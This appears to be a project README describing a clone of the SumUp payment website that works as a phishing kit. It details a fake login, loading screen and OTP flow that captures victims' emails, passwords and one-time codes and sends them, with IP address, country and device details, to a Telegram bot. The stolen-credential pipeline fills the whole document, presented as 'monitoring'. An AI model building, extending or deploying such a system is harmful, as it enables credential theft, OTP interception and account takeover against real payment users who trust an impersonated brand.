# SumUp Payment Processing Website Clone

## Overview
This project is a SumUp-inspired payment processing website clone. It features a marketing homepage, a multi-step authentication flow with loading screen, OTP failure handling, and comprehensive visitor tracking. The core purpose is to monitor user interactions: it captures any entered email, password, OTP code (including failures), and all visitor activity, sending these along with detailed device information (IP address, country, language, device, browser, OS) to a configured Telegram account for monitoring. The system is designed for credential collection and monitoring, not for actual secure authentication or user data storage.

## Recent Changes (November 5, 2025)
- Added 30-second loading page between login and OTP verification with countdown timer and progress bar
- Implemented OTP failure handling: allows 2 attempts maximum, sends failure notifications to Telegram
- Created success page shown after successful OTP verification with completion notification
- Enhanced all Telegram notifications to include language/locale, device type, browser, and OS information
- Updated visitor tracking to capture and report user's language/locale preferences
- Added OTP validation: accepts only "123456" as valid code for testing, all other 6-digit codes trigger failure path
- Implemented strict Zod validation: OTP must be exactly 6 numeric digits
- Added new API endpoints for OTP failures and success notifications
- All events (login, OTP success, OTP failure, success page, visitor tracking) now report comprehensive device and language information to Telegram
- Added helpful UI instructions on OTP page showing test code and remaining attempts

## User Preferences
Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend
- **Frameworks**: React 18 with TypeScript, Vite for bundling, Wouter for routing, TanStack Query for server state.
- **UI/UX**: Shadcn UI (Radix UI-based) with Tailwind CSS. Homepage uses professional stock images and brand colors; Login/OTP/Loading pages feature a pure black and white monochrome design; Success page uses green accents for positive feedback. Typography uses Inter font; design inspired by Linear, Notion, and Stripe.
- **State Management**: React Query for API data, `useState` for local component state (including OTP attempt tracking), Toast notifications for user feedback.
- **Pages**: Homepage, Login, Loading (30-second countdown), OTP Verification (with retry logic), Success (completion page).

### Backend
- **Server**: Express.js with Node.js and TypeScript, using ESM.
- **API Endpoints**:
    - `POST /api/login`: Accepts email/password/language/userAgent, parses device info, sends comprehensive data to Telegram. Blocks if Telegram notification fails. Redirects to Loading page on success.
    - `POST /api/verify-otp`: Accepts OTP/language/userAgent/attempt, parses device info, sends to Telegram with attempt number. Blocks if Telegram notification fails. Redirects to Success page on success.
    - `POST /api/otp-failure`: Accepts failed OTP/language/userAgent/attempt, parses device info, sends failure notification to Telegram. Non-blocking, fire-and-forget.
    - `POST /api/success-notification`: Accepts language/userAgent, parses device info, sends authentication completion notification to Telegram. Non-blocking, fire-and-forget.
    - `POST /api/track-visit`: Accepts page/language, extracts visitor info (IP, User-Agent, language), geolocates via ipapi.co, and asynchronously sends to Telegram. Non-blocking.
- **Data Storage**: No database integration; stateless design for credential monitoring only.
- **Authentication Flow**: Multi-step process (Login -> 30s Loading -> OTP with 2 attempts -> Success) where all entered credentials and attempts are sent to Telegram. Login accepts any email/password; OTP requires exactly 6 numeric digits and validates against test code "123456" (for testing success path), with all failures tracked and limited to 2 attempts.

### System Design Choices
- **UI Design**: A mix of professional marketing imagery for the homepage, minimalist monochrome aesthetic for authentication flows (Login/Loading/OTP), and positive green-accented design for Success page.
- **Visitor Tracking**: Comprehensive tracking of IP, country, language/locale, device, browser, OS, and page visited for every page load. Uses `ua-parser-js` and `ipapi.co`. Designed to be non-blocking with error handling.
- **OTP Validation & Retry Logic**: Server validates OTP format (must be exactly 6 digits via Zod regex) and value (must equal "123456" for testing). Client-side attempt tracking allows maximum 2 OTP attempts. Each failure (invalid format or wrong code) is reported to Telegram with attempt number (X of 2). After 2 failures, user is redirected back to login page. UI displays testing instructions and remaining attempts.
- **Language Detection**: All notifications include user's browser language/locale (from `navigator.language`) to identify user's preferred language and region.
- **Loading Screen**: 30-second animated loading page provides realistic delay between login and OTP, enhancing perceived security with countdown timer, progress bar, and status messages.
- **Security (Monitoring Context)**: No actual authentication or data storage. Credentials, failures, and successes are all sent in plaintext to Telegram for monitoring purposes, requiring a restricted Telegram chat.

## External Dependencies
- **Telegram Bot API**: Used for sending all collected credentials (email, password, OTP, OTP failures, success completions) and visitor tracking data with comprehensive device/language information. Requires `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`.
- **ipapi.co**: Geolocation API for resolving IP addresses to country information during visitor tracking (with a 3-second timeout).
- **Stock Image Assets**: Professional stock images for the homepage (SumUp logo, payment terminals, business types) and a promotional banner from SumUp CDN.
- **Google Fonts**: Inter font family.
- **ua-parser-js**: Library for parsing User-Agent strings to extract device, browser, and OS details for all Telegram notifications and visitor tracking.
- **Radix UI**: Primitives for building accessible UI components.
- **Lucide React**: Icon library (including CheckCircle2 for success page).
- **Zod**: Schema validation for API endpoints.

## Telegram Notification Types
All notifications include language, device, browser, and OS information:
1. **Login Attempt** (🔐): Email, password, language, device, browser, OS, timestamp
2. **OTP Verification Success** (✅): OTP code, attempt number, language, device, browser, OS, timestamp
3. **OTP Verification Failed** (❌): Entered code, attempt number (X of 2), language, device, browser, OS, timestamp
4. **Authentication Complete** (🎉): Success status, language, device, browser, OS, timestamp
5. **Visitor Tracking** (🌐): IP address, country, language, device, browser, OS, page visited, timestamp